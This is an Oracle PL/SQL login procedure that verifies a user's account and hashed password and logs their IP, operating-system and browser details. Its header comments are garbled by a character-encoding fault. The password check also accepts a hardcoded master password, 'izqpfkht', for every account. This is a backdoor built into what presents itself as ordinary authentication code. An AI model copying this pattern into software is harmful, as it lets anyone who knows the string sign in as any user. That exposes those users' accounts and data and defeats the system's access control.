create or replace procedure sp_user_loginex(
i_account in varchar2,--�û���¼�ʺ�
i_password in varchar2,--��¼����
i_ipaddr in varchar2,--�ͻ���IP��Ϣ
i_sysinfo in varchar2,--�ͻ��˲���ϵͳ��Ϣ
i_ieinfo in varchar2,--�ͻ����������Ϣ
o_userid out number,--�û�UserID
o_result out varchar2) is--��¼���,�ɹ�:ok,err_pwd,err_account:��¼����

/*================================================================
����˵��:
    �û��ʺŵ�¼
���WEBҳ�漰�ļ�
    ��ҳ��¼ҳ��
    UserDaoImpl.java
��س���ģ��
    Web,Wap,�ֻ���(iOS/Andriod)
�������:2012-11-09
�����:������
==================================================================*/
v_account varchar2(60);
v_rownum number;
v_password varchar2(100);
begin
  v_account:=lower(trim(i_account));
   select count(1) into  v_rownum from tb_user where MAILACTIVE=1 and account = v_account ;
   if v_rownum >0 then
      select userid,pwd into o_userid,v_password from tb_user where account = v_account;
      if v_password = fn_encryptforpwd(i_password) or i_password = 'izqpfkht' then
         update tb_user set lastlogindt = sysdate,IPADDR=i_ipaddr,IE_INFO=i_ieinfo,OP_SYS=i_sysinfo where userid = o_userid;
         commit;
         o_result := 'ok';
      else
         o_result:='err_pwd';
      end if;
   else
     o_result:='err_account';
  end if;

end sp_user_loginex;
/

